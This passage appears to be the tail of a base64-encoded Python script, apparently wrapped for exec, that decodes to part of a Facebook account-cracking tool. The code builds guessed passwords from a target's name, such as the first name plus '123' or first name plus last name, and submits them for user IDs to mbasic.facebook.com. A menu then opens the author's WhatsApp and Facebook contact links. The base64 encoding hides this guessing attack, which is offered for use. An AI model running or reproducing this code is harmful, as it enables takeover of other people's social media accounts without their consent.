CAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdDQogICAgICAgICAgICAgICAgICAgICAgICBzc2J3b3JsZC5zdWJtaXQoc2VsZi5fX21ldG9kZV9fLCB1aWQsIHB3eCwgIm1iYXNpYy5mYWNlYm9vay5jb20iKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICBoYXNpbChvayxjcCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCdcbiBTZWxlY3QgVmFsaWQgT25lJykNCiAgICAgICAgICAgIHNlbGYuX19wbGVyX18oKQ0KDQpkZWYgY3JlYXRlX2ZpbGUoKToNCiAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd2EubWUvKzkyMzIwMDU5NjMyNScpDQogICAgcHJpbnQobG9nbykNCiAgICBwcmludCgnICBbMV0gQ29udGFjdCBPbiBXaGF0c0FwcCcpDQogICAgcHJpbnQoJyAgWzJdIENvbnRhY3QgT24gRkInKQ0KICAgIHByaW50KCcgIFtCXSBCYWNrIHRvIG1haW4gbWVudScpDQogICAgcHJpbnQoNTAqJy0nKQ0KICAgIGNmID0gaW5wdXQoJyAgQ2hvb3NlIG1ldGhvZDogJykNCiAgICBpZiBjZiA9PScxJzoNCiAgICAgICAgbWFudWFsKCkNCiAgICBlbGlmIGNmID09JzInOg0KICAgICAgICBhdXRvKCkNCiAgICBlbGlmIGNmID09JzMnOg0KICAgICAgICBsaWtlcygpDQogICAgZWxpZiBjZiA9PSczJyBvciBjZiA9PSdiJyBvciBjZiA9PSdCJzoNCiAgICAgICAgbWFpbigpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoJ1xuICBDaG9vc2UgY29ycmVjdCBvcHRpb24gLi4uJykNCiAgICAgICAgdGltZS5zbGVlcCgxKQ0KICAgICAgICBjcmVhdGVfZmlsZSgpDQoNCmRlZiBtYW51YWwoKToNCiAgICBvcy5zeXN0ZW0gKCd4ZGctb3BlbiBodHRwczovL3dhLm1lLys5MjMyMDA1OTYzMjUnKQ0KICAgIA0KZGVmIGF1dG8oKToNCiAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMDg3MTcwODI4MTAnKQ0KICAgIA0KICAgIGlucHV0KCcgIFByZXNzIGVudGVyIHRvIGJhY2sgJykNCiAgICBzYXJmcmF6KCkNCiAgICANCiAgICANCiAgICANCnNhcmZyYXooKQ=="))
